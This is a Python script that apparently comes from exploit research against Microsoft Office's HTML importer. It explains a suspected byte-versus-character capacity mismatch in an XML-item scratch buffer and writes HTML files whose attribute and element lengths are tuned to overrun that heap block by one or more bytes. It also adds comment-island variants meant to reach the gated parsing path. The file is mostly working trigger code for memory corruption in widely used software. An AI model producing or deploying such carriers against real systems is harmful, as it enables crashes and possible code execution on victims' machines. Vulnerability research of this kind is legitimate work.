#!/usr/bin/env python3
"""xml_item_carriers.py -- HTML/MHTML carriers that drive the XML-item scratch slot twice.

Background (see STATE §46): the HTML importer asks `Mso98Win32Client!FObtainXmlItemString(dstSlot, n,
bufSlot, capSlot)` for a scratch buffer for each XML item (tag name goes through one slot pair, an
attribute value through another).  What is read on the callee side is:

  grow path   : capacity slot <- 2*n + 33   (bytes), buffer reallocated to 2*n + 33 bytes
  reuse test  : `if (n + 1 > [capSlot]) grow else return the existing buffer`   (n + 1 = characters)
  caller side : `memcpy(out, src, 2*n); *((WORD*)out + n) = 0`   (no comparison against [capSlot])

Because the stored quantity is a byte count while the comparison is against a character count, the
reuse branch is entered for every `n` up to `2*n_prev + 32`, while the caller's own write is
`2*n + 2` bytes.  The pair (n_prev, n) = (k, k + 16) is the smallest case where the reuse branch is
taken *and* the write passes the end of the block: `2*(k+16)+2 - (2*k+33) = 1` byte.

So each carrier here carries one *increasing* pair (or triple) of attribute lengths through the same
slot, and the ladder covers the boundary from several sides.  Every file is an ordinary HTML document
with an XML namespace declared; nothing else about it is unusual.

    xml_item_carriers.py <out-dir>
"""
import os
import sys

HEAD = ('<html xmlns:o="urn:schemas-microsoft-com:office:office" '
        'xmlns:a="urn:schemas-microsoft-com:office:art" '
        'xmlns:v="urn:schemas-microsoft-com:vml" '
        'xmlns="http://www.w3.org/TR/REC-html40">'
        '<head><meta name=Generator content="Microsoft PowerPoint 16">'
        '<title>xml item scratch carrier</title></head><body>')
TAIL = '</body></html>'


def attr(n, ch):
    """One namespaced element whose own attribute value is exactly n characters of `ch`."""
    return '<a:itx a:val="%s">' % (ch * n)


def close(k):
    return '</a:itx>' * k


SET_ITALIC = ('<div class=Slide><p>%s%s</p></div>')

# (name, steps) — steps are (character count, fill character).  Two steps means the second request is
# the one measured against the capacity left by the first.
CASES = [
    ('x01_40_56', [(40, 'A'), (56, 'B')]),          # smallest predicted overrun: 1 byte
    ('x02_40_55', [(40, 'A'), (55, 'B')]),          # one below the boundary (control, should be exact fit)
    ('x03_40_57', [(40, 'A'), (57, 'B')]),          # two bytes over
    ('x04_200_216', [(200, 'A'), (216, 'B')]),      # same boundary at a larger base
    ('x05_200_432', [(200, 'A'), (432, 'B')]),      # n2 = 2*n1+32 -> last value still on the reuse branch
    ('x06_200_433', [(200, 'A'), (433, 'B')]),      # one above: should take the grow branch
    ('x07_1000_1016', [(1000, 'A'), (1016, 'B')]),
    ('x08_1000_2032', [(1000, 'A'), (2032, 'B')]),
    ('x09_ladder', [(n, chr(65 + (i % 26))) for i, n in
                    enumerate([17, 33, 49, 65, 81, 97, 113, 129, 145, 161, 177, 193])]),
    ('x10_decrease', [(400, 'A'), (60, 'B'), (400, 'C'), (60, 'D')]),   # reuse after a large item
    ('x11_same', [(80, 'A'), (80, 'B')]),                               # equal-length control
    ('x12_17_33', [(17, 'A'), (33, 'B')]),                              # the first boundary with a tiny base
    ('x13_16_32', [(16, 'A'), (32, 'B')]),
    ('x14_8_24', [(8, 'A'), (24, 'B')]),
    ('x15_2000_2016', [(2000, 'A'), (2016, 'B')]),
    ('x16_2000_4032', [(2000, 'A'), (4032, 'B')]),
    ('x00_plain', [(40, 'A'), (40, 'B')]),          # control with the same shape as x11
]



# Comment-island shapes.  Why these exist: the state field the XML branch is gated on
# ([[HISD+0x2b0]+0x10440] == 5) is written only by the HTML comment layer in mso
# (FInitComment 0x63c51a on the HICD control byte +0x60 bit 0x20; FProcessComment 0x87d4cc and
# TkLexHtml 0x1a918 on (HISD+8 & 0x0c000000) == 0x04000000, bit 0x1a being set by FInitComment and
# cleared by FCommitComment) -- see STATE SS58-SS59.  So each shape below keeps the <xml> island
# inside a comment in one of the spellings Office's own exporters write, and puts the (n1, n2)
# length pair on the item kinds that the two slot pairs inside FProcessOpenXmlTag consume
# (element name / attribute value / xmlns URI); 'bare' is the same markup without the comment.
SHAPES = {
    'isl': lambda a, b: '<!-- <xml>' + a + b + '</xml> -->',
    'c9': lambda a, b: '<!--[if gte mso 9]><xml><o:Doc>' + a + b + '</o:Doc></xml><![endif]-->',
    'cmso': lambda a, b: '<!--[if mso]><xml><w:WordDocument>' + a + b + '</w:WordDocument></xml><![endif]-->',
    'bare': lambda a, b: '<xml>' + a + b + '</xml>',
    'xns': lambda a, b: '<!-- <xml xmlns:c="' + a + '" xmlns:d="' + b + '"><c:i/><d:i/></xml> -->',
    'gfx': lambda a, b: ('<?xml a="' + a + '" b="' + b + '"?>'
                         '<!-- <xml><v:group o:gfxdata="' + a + '"><v:shape o:spid="' + b +
                         '"/></v:group></xml> -->'),
}


def shape_items(kind, n1, n2):
    # The two items of a pair, as element names, xmlns URIs or attribute values.
    if kind in ('isl', 'c9', 'cmso', 'bare'):
        i1 = '<a:' + 'A' * max(1, n1 - 2) + '/>'
        i2 = '<b:' + 'B' * max(1, n2 - 2) + '/>'
    elif kind == 'xns':
        i1, i2 = 'C' * n1, 'D' * n2
    else:
        i1, i2 = 'E' * n1, 'F' * n2
    return SHAPES[kind](i1, i2)


def main():
    out = sys.argv[1] if len(sys.argv) > 1 else 'carriers_x'
    os.makedirs(out, exist_ok=True)
    written = 0
    for name, steps in CASES:
        body = [HEAD]
        for n, ch in steps:
            body.append(SET_ITALIC % (attr(n, ch), close(1)))
        body.append(TAIL)
        for ext in ('.htm',):
            p = os.path.join(out, name + ext)
            with open(p, 'w', encoding='ascii', newline='') as fh:
                fh.write(''.join(body))
            written += 1
        lens = ','.join(str(n) for n, _ in steps)
        print('%-18s lengths=%s bytes=%d' % (name, lens, os.path.getsize(os.path.join(out, name + '.htm'))))
    # comment-island families: the same length pairs, one file per (shape, pair)
    nfam = 0
    for name, steps in CASES:
        if len(steps) < 2:
            continue
        n1, n2 = steps[0][0], steps[1][0]
        for kind in sorted(SHAPES):
            body = HEAD + shape_items(kind, n1, n2) + '<div class=Slide><span>t</span></div>' + TAIL
            cn = 'c' + kind + '_' + name[1:].split('_')[0] + '_' + str(n1) + '_' + str(n2)
            with open(os.path.join(out, cn + '.htm'), 'w', encoding='ascii', newline='') as fh:
                fh.write(body)
            written += 1
            nfam += 1
    print('carriers=%d base=%d comment_islands=%d dir=%s' % (written, len(CASES), nfam, out))
    if written < len(CASES) + nfam:
        raise SystemExit('CARRIER_GENERATION_SHORT')


if __name__ == '__main__':
    main()
